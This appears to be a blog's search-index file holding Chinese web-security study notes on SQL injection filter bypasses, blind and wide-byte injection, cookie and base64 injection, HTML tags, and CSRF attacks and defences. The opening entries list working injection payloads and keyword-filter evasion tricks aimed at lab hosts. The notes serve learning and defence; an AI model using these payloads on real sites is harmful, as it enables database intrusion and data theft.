+    <content type="text"><![CDATA[大小写绕过：此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。 例如：id=1 UNion SElecT 1,2,3 替换关键字：这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过。 例如：id=1 UNIunionON SELselectECT 1,2,3 空格绕过：有些情况SQL会过滤空格，使得空格无法生效，可以用一下方式绕过。 例如： id=1/**/union/**/select/**/1,2,3 //用/**/代替空格 id=1%0aunion%a0select%a01,2,3 //用%0a(回车)代替空格 id=1()union()select()1,2,3 //用()代替空格 …… 引号绕过（用16进制）：会使用到引号的地方一般是在最后的where子句中，如select column_name from information_schema.tables where table_name=’users’ 将’users’转变为16进制为0x7573657273 逗号绕过：在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。 使用from for绕过（substr()和mid()可以使用)：例：id=1 and substr(database(),1,1)=’a’ ​ id=1 and substr(database() from 1 for 1)=’1’ 使用join绕过：union select 1,2等价于union select * from (select 1)a join (select 2)b 使用like：select ascii(mid(user(),1,1))=80等价于select user() like ‘r%’ 对于limit可以使用offset来绕过：select * from news limit 0,1等价于select * from news limit 1 offset 0 比较符号绕过（’&gt;’,’&lt;’,’=’）：同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 用greatest，least代替大于小于符号：例：id=1 and length(database())&gt;2 ​ id=1 and greatest(length(database()),2)=2 ​ *greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。 使用between and：*between a and b：返回a，b之间的数据，不包含b。 绕过等号：使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt; or and xor not绕过：有些时候SQL会过滤上述的关键字，导致输入的关键字不能执行。 使用大小写、替换关键字绕过：id=1 and 1=1等价于id=1 aandnd 1=1 id=1 and 1=1等价于id=1 ANd 1=1 使用字符代替：or=|| and=&amp;&amp; xor=| not=! 注释符号绕过：一般常用注释符号有#，–+，– ，– -等，但是SQL如果过滤了这些注释符，就会使得注释无效。 例：id=1’ union select 1,2,3 id=1’ union select 1,2,3||’1或者id=1’ union select 1,2,’3 *单引号的作用是将后面的单引号闭合掉 内联绕过：例如，一个函数过滤了select关键字，双写，大小写等方法都不奏效，这时可以使用内联绕过。 id=1 union select 1,database(),3 这里可以用/*!select*/代替select，/*！*/中的内容将强制执行 通用编码绕过：如URLEncode编码，ASCII,HEX,unicode编码绕过： or 1=1即为%6f%72%20%31%3d%31 等价函数绕过：SQL若过滤了每个函数导致函数不能使用，可以寻找它的等价函数来替代当前函数。 hex()、bin() ==&gt; ascii() sleep() ==&gt;benchmark() concat_ws()==&gt;group_concat() mid()、substr() ==&gt; substring() 宽字节注入：过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 &#39; 。 在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路。 1、%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：id=-1%df%27union select 1,user(),3–+ 2、将 &#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。 一般产生宽字节注入的PHP函数： 1.replace（）：过滤 ‘ \ ，将 ‘ 转化为 &#39; ，将 \ 转为 \，将 “ 转为 &quot; 。用思路一。 2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一 （防御此漏洞，要将 mysql_query 设置为 binary 的方式） 3.mysql_real_escape_string()：转义下列字符：\x00 \n \r \ ‘ “ \x1a （防御方法，将mysql编码方式设置为gbk即可）]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SQL注入基本知识]]></title>
+    <url>%2F2019%2F08%2F09%2FSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%2F</url>
+    <content type="text"><![CDATA[例：http://127.0.0.1/web/union.php?id=1 SQL注入概念：所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 SQL注入原理：SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 根据相关技术原理，SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面： ①不当的类型处理； ②不安全的数据库配置； ③不合理的查询集处理； ④不当的错误处理； ⑤转义字符处理不合适； ⑥多个提交处理不当。 判断注入类型（整型）：id=1 页面正常 id=1 and 1=1 页面正常 id=1 and 1=2 页面报错 *从以上三个条件可以判断该页面存在sql注入，并且为整型 判断注入类型（字符型）： id=1 页面正常 id=1 and 1=1 页面正常 id=1 and 1=2 页面正常 id=1’ and 1=1# 页面正常 id=1’ and 1=2# 页面报错 *从以上五个条件可以判断该页面存在sql注入，并且为字符型 判断注入类型（时间盲注）：*时间盲注在任何时候不会报错，也不会出现任何有用信息 *id=1’ and sleep(5) –+：若页面响应时间延迟，可以判断存在哪种注入 常用注释符：#，–+，– ，– -等，或者可以将字符转换成对应的URL 利用Burp进行盲注：布尔盲注指页面只返回true和false两个结果，并没有返回报错等有用信息 以爆破数据库为例：1’ and substr(database(),1,1)=’a’–+ 1、用Burp进行拦截抓包 2、右键-发送给测试器 3、清除§-添加§ ​ *清除§之后，添加的位置为要变动的值，如上面的’a’ 4、有效载荷-从列表中添加 ​ *字典除了Burp自带的一些简单字典外，还可以选择外部的字典。 5、开始攻击 ​ *攻击会自动遍历字典里的值，正确的值在返回的字符长度上和错误值不相同，这样就可以确认具体字符。 ​ *若是时间盲注，正确和错误信息返回的长度都是一样的，此时需要看数据返回时间，具体操作：列-接收响应计数。]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Cookie注入]]></title>
+    <url>%2F2019%2F08%2F09%2FCookie%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[例：http://172.16.13.29/web/cookie.php 利用Burp抓包：*抓包后发送到重发器，然后在重发器的cookie值后面构造语句 在重发器中构造语句:*这里和其他注入方式一样，只不过语句是在Burp的重发器中构造的 要点：*cookie注入其原理也和平时的注入一样，只不过说我们是将提交的参数已cookie方式提交了，而一般的注入我们是使用get或者post方式提交，get方式提交就是直接在网址后面加上需要注入的语句，post则是通过表单方式，get和post的不同之处就在于一个我们可以通过IE地址栏处看到我们提交的参数，而另外一个却不能。 *相对post和get方式注入来说，cookie注入就要稍微繁琐一些了，要进行cookie注入，我们首先就要修改cookie，这里就需要使用到Javascript语言了。另外cookie注入的形成有两个必须条件，条件1是：程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。条件2是：在条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取。]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[BASE64注入]]></title>
+    <url>%2F2019%2F08%2F09%2FBase64%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[例：http://172.16.13.29/web/base64.php 语句编码：*base64注入的原理是将构造语句进行base64编码，例如id=1，这里把等号后面的内容变成Base64的编码方式，意思就是1→MQ==，在整个注入过程的构造语句都编码成Base64，视具体情况，还可编码成url等其他编码方式。 *注入过程与其他主流的注入方式相同。]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[HTML基础]]></title>
+    <url>%2F2019%2F08%2F09%2FHTML%E5%9F%BA%E7%A1%80%2F</url>
+    <content type="text"><![CDATA[HTML基本介绍概念：HTML是超文本标记语言，不是传统定义的编程语言，又是一种标准结构化语言。 HTML是构建我们一个标准的网页标准语言，它定义一套严格标签、内容、方法等规范。 基本格式： &lt;标签 属性名=’属性值’ onclick onxxx=方法&gt;内容（元素）&lt;/标签&gt; 发展历史：HTML发展了5代，目前兼容或运行的HTML（4-5），浏览器多为双核心浏览器（高速：webkit/兼容：IE/Edge） 基本组成： HTML和Head是系统级，不显现，Head中的内容是可对影响的浏览器本身的，它具有对浏览器的控制权限，只有Body才会显现。 优先级：HTML&gt;Head&gt;Body&gt;元素 HTML：网页基础结构，必不可少，如果不写，浏览器在渲染时会自动补全，该标签具有很高的优先级，因此会多跟浏览器本身的可视区域形成一种关联关系。 Head：网页基础结构的组成标签，原则上不可少，有些浏览器不会自动补全该标签，该标签的优先级受限于HTML。 Body：网页基础结构的组成标签，原则上可以不写，但是一定会自动不全该标签,他的可视区域受限于HTML。 浏览器两个基本组件：一个解释器（告诉浏览器标签的作用和级别），一个渲染器（转化成UI界面）。 HTML版本/规范：HTML 1991 HTML+ 1993 HTML 2.0 HTML 3.0 HTML 4.0 （不存在） HTML 4.01 1999 XHTML 1.0（微软） 2000 HTML 5 2012 XHTML 5（微软） 2013 识别HTML版本/规范方法：声明HTML的版本/规范声明没有具体的大小写要求，可以全大写也可以全小写HTML 5: HTML 4.01: XHTML 1.0: *微软与W3C之争：争夺规范和话语权，微软是在W3C基础上增加了自己的一些内容：自有标签库/方法库/属性库。还增加了浏览器的解释和渲染的规范和话语权：IE5/6（HTML&lt;4.01） IE7/8/9（HTML&gt;4.01&lt;XHTML1.0） IE10/11(HTML5/XHTML5)浏览器的份额发生变化导致微软的IE份额下滑，最后是由苹果和谷歌联合推动webkit内核胜利。 Head区域： Meta标签是头功能定义：定义编码/缩放比例Title 页面标题定义，也是唯一一个可以直观感受到HTMLScript 脚本Style 样式Link 引用标签 Body区域：各类Tags按功能划分： ​ 1、容器标签：常用的div，p，span​ 2、内容标签：常用的div，p，span，input，textarea，video，audio，img​ 3、交互标签: 常用的input，button，a标签的套路（规则）标准写法：&lt;标签名 属性 方法&gt;&lt;/标签名&gt;简易写法：&lt;标签名 内容属性支持/&gt;标签名：A-Z（百度html标签）div特性：独占一行(width：100%)，没有行高（height：0/none），没有边框（border：0/none）…… 属性： 通用标签：id name style class width height data 特有标签：src rel value 自定义：多配合JS用方法：可以通过关键字this来获得安全列表安全问题：有一些安全事件是采用改变或拦截标签后给它赋予一些方法，来获得内容 常见的界面布局：H/工 I/i T 口 国 框……页面布局原则：先布局再内容 HTML标签特点：1、 成对出现 2、 最大化写法：标签名 属性名 方法名 内容 最小化写法：(只有基本内容的一个或多个，必须要有的是标签名) 特殊写法：不带尖括号 ：before3、 标签一般依赖于body标签 常用标签：1、容器标签：块级标签：独占一行、没有行高（没有内容时）、没有边框、position：属性会重写，原点定位：左上角 移动一个DIV：top left right bottom这四个属性基于position， 如left：100px，不表示向左移动100px ，而是移动后的位置距离左边100px *: 将一行分为多个小节/段，方向是横向分段，段的长度默认为0，长度可以有内容来定义，也可以由width定义（4.01版本以前才适用） *： 段落标签，与span类似，但是是纵向的分段。 *： 表格标签 表示表格的一行 表示表格的一列 表示表头 *一号字 *四号字： 字体大小标签 &lt;*br/&gt;： 换行标签 *： 生成水平线 *： 表单 &lt;*button&gt;按钮： *多行文本框 one two 下拉菜单 标注标签 2、 格式标签：&lt;b&gt;加粗&lt;i&gt;斜体 *abc 结果为cba*块引用 &lt;em&gt;强调字体&lt;del&gt;文字划横线文字&lt;sub&gt;下标文字&lt;sup&gt;下标&lt;ruby&gt;好hao&lt;small&gt;小号字体&lt;strong&gt;强调字体&lt;u&gt;下划线 3、框架：&lt;*iframe src=”http://www.baidu.com”&gt;4.01， 框架最早定义，框架区域或窗口 4、图像标签：&lt;*img src=””&gt; 画布 &lt;*map&gt;定义热区 5、媒体标签：** *外部文本轨道 6、链接标签：&lt;*a href=”javascript:void(0);”&gt;链接 定义与外部资源的关系 导航链接：H5的新标签 &lt;*nav&gt; 7、其他标签：*无序列表 *有序列表 *列表项 Js的基本应用Document：当前的文本对象，里面有当前访问页面的所有标签 出现密码没有加密的情况：输入时开始加密加密方法：md5（）Md5（md5（））Md5（md5（“密码”）+“自定义密钥”）]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>HTML</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[HTML标签]]></title>
+    <url>%2F2019%2F08%2F09%2FHTML%E6%A0%87%E7%AD%BE%2F</url>
+    <content type="text"><![CDATA[HTML标签：标签名 描述 &lt;!--...--&gt; 定义注释 &lt;!DOCTYPE&gt; 定义文档类型 &lt;a&gt; 定义锚 &lt;abbr&gt; 定义缩写 &lt;acronym&gt; 定义只取首字母的缩写 &lt;applet&gt; 定义嵌入的applet（不赞成使用） &lt;area&gt; 定义图像映射内部的区域 &lt;article&gt; 定义文章 &lt;aside&gt; 定义页面内容之外的内容 &lt;audio&gt; 定义声音内容 &lt;b&gt; 定义粗体字 &lt;base&gt; 定义页面中所有链接的默认地址或默认目 &lt;basefont&gt; 定义页面中文本的默认字体、颜色尺寸（不赞成使用） &lt;bdi&gt; 定义文本的文本方向，使其脱离周围文本的方向设置 &lt;bdo&gt; 定义文字方向 &lt;big&gt; 定义大号文本 &lt;blockquote&gt; 定义长的引用 &lt;body&gt; 定义文档的主体 &lt;br&gt; 定义简单的折行 &lt;button&gt; 定义按钮（push button） &lt;canvas&gt; 定义图形 &lt;caption&gt; 定义表格标题 &lt;center&gt; 定义居中文本（不赞成使用） &lt;cite&gt; 定义引用（citation） &lt;code&gt; 定义计算机代码文本 &lt;col&gt; 定义表格中一个或多个列的属性值 &lt;colgroup&gt; 定义表格中供格式化的列组 &lt;command&gt; 定义命令按钮 &lt;datalist&gt; 定义下拉列表 &lt;dd&gt; 定义列表中项目的描述 &lt;del&gt; 定义被删除的文本 &lt;details&gt; 定义元素细节 &lt;dir&gt; 定义目录列表（不赞成使用） &lt;div&gt; 定义文档中的节 &lt;dfn&gt; 定义项目 &lt;dialog&gt; 定义对话框或窗口 &lt;dt&gt; 定义列表中的项目 &lt;em&gt; 定义强调文本 &lt;embed&gt; 定义外部交互内容或插件 &lt;fieldset&gt; 定义围绕表单中元素的边框 &lt;figcaption&gt; 定义figure元素标题 &lt;figure&gt; 定义媒介内容的分组，以及它们的标题 &lt;font&gt; 定义文字的字体、尺寸和颜色 &lt;footer&gt; 定义section或page的页脚 &lt;form&gt; 定义供用户输入的HTML表单 &lt;frame&gt; 定义框架集的窗口或框架 &lt;frameset&gt; 定义框架集 &lt;h1&gt;to&lt;h6&gt; 定义HTML标题 &lt;head&gt; 定义关于文档的信息 &lt;header&gt; 定义section或page的页眉 &lt;hr&gt; 定义水平线 &lt;html&gt; 定义HTML文档 &lt;i&gt; 定义斜体字 &lt;iframe&gt; 定义内联框架 &lt;img&gt; 定义图像 &lt;input&gt; 定义输出控件 &lt;ins&gt; 定义被插入文本 &lt;isindex&gt; 定义与文档相关的可搜索索引 &lt;kbd&gt; 定义键盘文本 &lt;keygen&gt; 定义生成密钥 &lt;label&gt; 定义input元素的标注 &lt;legend&gt; 定义fieldset元素的标题 &lt;li&gt; 定义列表中的项目 &lt;link&gt; 定义文档与外部资源的关系 &lt;map&gt; 定义图像映射 &lt;mark&gt; 定义有记号的文本 &lt;menu&gt; 定义菜单列表 &lt;meta&gt; 定义关于HTML文档的元信息 &lt;meter&gt; 定义预定义范围内的度量 &lt;nav&gt; 定义导航链接 &lt;noframe&gt; 定义针对不支持框架的用户的替代内容 &lt;noscript&gt; 定义针对不支持客户端脚本的用户的替代内容 &lt;object&gt; 定义内嵌对象 &lt;ol&gt; 定义有序列表 &lt;optgroup&gt; 定义选择列表中相关选项的组合 &lt;option&gt; 定义选择列表中的选项 &lt;output&gt; 定义输出的一些类型 &lt;p&gt; 定义段落 &lt;param&gt; 定义对象的参数 &lt;pre&gt; 定义预格式文本 &lt;progress&gt; 定义任何类型的任务的进度 &lt;q&gt; 定义短的引用 &lt;rp&gt; 定义若浏览器不支持ruby元素显示的内容 &lt;rt&gt; 定义ruby注释的解释 &lt;ruby&gt; 定义ruby注释 &lt;s&gt; 定义加删除线的文本 &lt;samp&gt; 定义计算机代码样本 &lt;script&gt; 定义客户端脚本 &lt;section&gt; 定义section &lt;select&gt; 定义选择列表（下拉列表） &lt;small&gt; 定义小号文本 &lt;source&gt; 定义媒介源 &lt;span&gt; 定义文档中的节 &lt;strike&gt; 定义加删除线的文本 &lt;strong&gt; 定义强调文本 &lt;style&gt; 定义文档的样式信息 &lt;sub&gt; 定义下标文本 &lt;summary&gt; 为&lt;details&gt;元素定义可见的标题 &lt;sup&gt; 定义上标文本 &lt;table&gt; 定义表格 &lt;tbody&gt; 定义表格中的主题内容 &lt;td&gt; 定义表格中的单元 &lt;textarea&gt; 定义多行的文本输入控件 &lt;tfoot&gt; 定义表格中的表注内容（脚注） &lt;th&gt; 定义表格中的表头单元格 &lt;thead&gt; 定义表格中的表头内容 &lt;time&gt; 定义日期时间 &lt;title&gt; 定义文档的标题 &lt;tr&gt; 定义表格中的行 &lt;track&gt; 定义用在媒体播放器中的文本轨道 &lt;tt&gt; 定义打字机文本 &lt;u&gt; 定义下划线文本 &lt;ul&gt; 定义无序列表 &lt;var&gt; 定义文本的变量部分 &lt;video&gt; 定义视频 &lt;wbr&gt; 定义视频 &lt;xmp&gt; 定义预格式文本 &lt;dl&gt; 定义列表]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>HTML</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CSRF防范]]></title>
+    <url>%2F2019%2F08%2F09%2FCSRF%E9%98%B2%E8%8C%83%2F</url>
+    <content type="text"><![CDATA[CSRF漏洞防御 CSRF漏洞防御主要可以从三个层面进行，即服务端的防御、用户端的防御和安全设备的防御。 服务端的防御 目前业界服务器端防御CSRF攻击主要有三种策略：验证HTTP Referer字段，在请求地址中添加token并验证，在HTTP头中自定义属性并验证。下面分别对这三种策略进行简要介绍。 1 、验证HTTP Referer字段 根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。比如某银行的转账是通过用户访问http://bank.test/test?page=10&amp;userID=101&amp;money=10000页面完成，用户必须先登录bank. test，然后通过点击页面上的按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL（本例中，通常是以bank. test域名开头的地址）。而如果攻击者要对银行网站实施CSRF攻击，他只能在自己的网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向攻击者的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank. test开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。 java获取HTTP Referer代码： ​ // 获取请求是从哪里来的 ​ String referer = request.getHeader(“referer”); ​ // 如果是直接输入的地址，或者不是从本网站访问的重定向到本网站的首页 ​ if (referer == null || !referer.startsWith(“http://localhost&quot;)) { ​ response.sendRedirect(“/day06/index.jsp”); ​ // 然后return，不要输出后面的内容了 ​ return; ​ } 2、 在请求地址中添加token并验证 CSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于Cookie中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的Cookie来通过安全验证。由此可知，抵御CSRF攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。鉴于此，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。 3 、在HTTP头中自定义属性并验证 自定义属性的方法也是使用token并进行验证，和前一种方法不同的是，这里并不是把token以参数的形式置于HTTP请求之中，而是把它放到HTTP头中自定义的属性里。通过XMLHttpRequest这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把token值放入其中。这样解决了前一种方法在请求中加入token的不便，同时，通过这个类请求的地址不会被记录到浏览器的地址栏，也不用担心token会通过Referer泄露到其他网站。 4 、用户端的防御 对于普通用户来说，都学习并具备网络安全知识以防御网络攻击是不现实的。但若用户养成良好的上网习惯，则能够很大程度上减少CSRF攻击的危害。例如，用户上网时，不要轻易点击网络论坛、聊天室、即时通讯工具或电子邮件中出现的链接或者图片；及时退出长时间不使用的已登录账户，尤其是系统管理员，应尽量在登出系统的情况下点击未知链接和图片。除此之外，用户还需要在连接互联网的计算机上安装合适的安全防护软件，并及时更新软件厂商发布的特征库，以保持安全软件对最新攻击的实时跟踪。]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CSRF基础]]></title>
+    <url>%2F2019%2F08%2F09%2FCSRF%E5%9F%BA%E7%A1%80%2F</url>
+    <content type="text"><![CDATA[CSRF漏洞简介 ： CSRF（Cross-Site Request Forgery，跨站点伪造请求）是一种网络攻击方式，该攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在未授权的情况下执行在权限保护之下的操作，具有很大的危害性。具体来讲，可以这样理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 CSRF攻击方式并不为大家所熟知，实际上很多网站都存在CSRF的安全漏洞。早在2000年，CSRF这种攻击方式已经由国外的安全人员提出，但在国内，直到2006年才开始被关注。2008年，国内外多个大型社区和交互网站先后爆出CSRF漏洞，如：百度HI、NYTimes.com（纽约时报）、Metafilter（一个大型的BLOG网站）和YouTube等。但直到现在，互联网上的许多站点仍对此毫无防备，以至于安全业界称CSRF为“沉睡的巨人”，其威胁程度由此“美誉”便可见一斑。 CSRF攻击原理及实例 ： CSRF攻击原理比较简单，如图1所示。其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。 1 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A； 2 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A； 3 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B； 4 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A； (**网站B对网站A发出一个请求的同时，浏览器也会把网站A产生Cookie信息带上)–相当于浏览器访问网站A—这是user信息被盗用的关键** 5 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 CSRF攻击分类：CSRF漏洞一般分为站外和站内两种类型。 CSRF站外类型的漏洞本质上就是传统意义上的外部提交数据问题。通常程序员会考虑给一些留言或者评论的表单加上水印以防止SPAM问题（这里，SPAM可以简单的理解为垃圾留言、垃圾评论，或者是带有站外链接的恶意回复），但是有时为了提高用户的体验性，可能没有对一些操作做任何限制，所以攻击者可以事先预测并设置请求的参数，在站外的Web页面里编写脚本伪造文件请求，或者和自动提交的表单一起使用来实现GET、POST请求，当用户在会话状态下点击链接访问站外Web页面，客户端就被强迫发起请求。 CSRF站内类型的漏洞在一定程度上是由于程序员滥用类变量造成的。在一些敏感的操作中（如修改密码、添加用户等），本来要求用户从表单提交发起请求传递参数给程序，但是由于使用了REQUEST类变量造成的。在一些敏感的操作中（如修改密码、添加用户等），本来要求用户从表单提交发起POST请求传递参数给程序，但是由于使用了_REQUEST等变量，程序除支持接收POST请求传递的参数外也支持接收GET请求传递的参数，这样就会为攻击者使用CSRF攻击创造条件。一般攻击者只要把预测的请求参数放在站内一个贴子或者留言的图片链接里，受害者浏览了这样的页面就会被强迫发起这些请求。 CSRF攻击实例：下面以Axous 1.1.1 CSRF Add Admin Vulnerability（漏洞CVE编号：CVE-2012-2629）为例，介绍CSRF攻击具体实施过程。 Axous是一款网上商店应用软件。Axous 1.1.1以及更低版本在实现上存在一个CSRF漏洞，远程攻击者可以通过构造特制的网页，诱使该软件管理员访问，成功利用此漏洞的攻击者可以添加系统管理员。利用此漏洞主要包含以下三个过程： 攻击者构造恶意网页。在实施攻击前，攻击者需要构造一个与正常添加管理员用户基本一样的网页，在该恶意网页中对必要的参数项进行赋值，并将该网页的action指向正常添加管理员用户时访问的URL，核心代码如图2所示； 攻击者利用社会工程学诱使Axous系统管理员访问其构造的恶意网页； 执行恶意代码。当系统管理员访问恶意网页时，恶意代码在管理员不知情的情况下以系统管理员的合法权限被执行，攻击者伪造的管理员账户添加成功。 ​ 参考：https://www.cnblogs.com/shikyoh/p/4959678.html https://www.freebuf.com/column/155800.html]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>CSRF</tag>
+      </tags>
+  </entry>
+</search>
